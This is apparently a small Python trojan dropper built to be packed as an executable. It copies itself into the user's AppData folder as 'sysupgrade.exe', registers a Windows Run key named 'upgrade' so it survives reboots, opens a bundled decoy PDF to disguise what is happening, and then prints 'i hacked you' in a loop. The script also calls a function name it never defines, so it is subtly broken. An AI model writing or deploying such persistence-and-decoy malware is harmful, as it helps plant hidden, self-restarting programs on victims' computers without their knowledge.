import time
import subprocess
import os
import shutil
import sys

def add_to_regedit():
    #persistance

    new_file = os.environ["appdata"] + "\\sysupgrade.exe"

    if not os.path.exists(new_file):
        
        shutil.copyfile(sys.executable, new_file)

        regedit_command = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file

        subprocess.call(regedit_command, shell = True)

add_to_regedit()

def open_edited():

    added_file = sys._MEIPASS + "\\kal.pdf"
    
    subprocess.Popen(added_file, shell = True)
    
open_added_file()

x = 0

while x < 100:
	
	print("i hacked you")
	
	x += 1
	
	time.sleep(0.5)
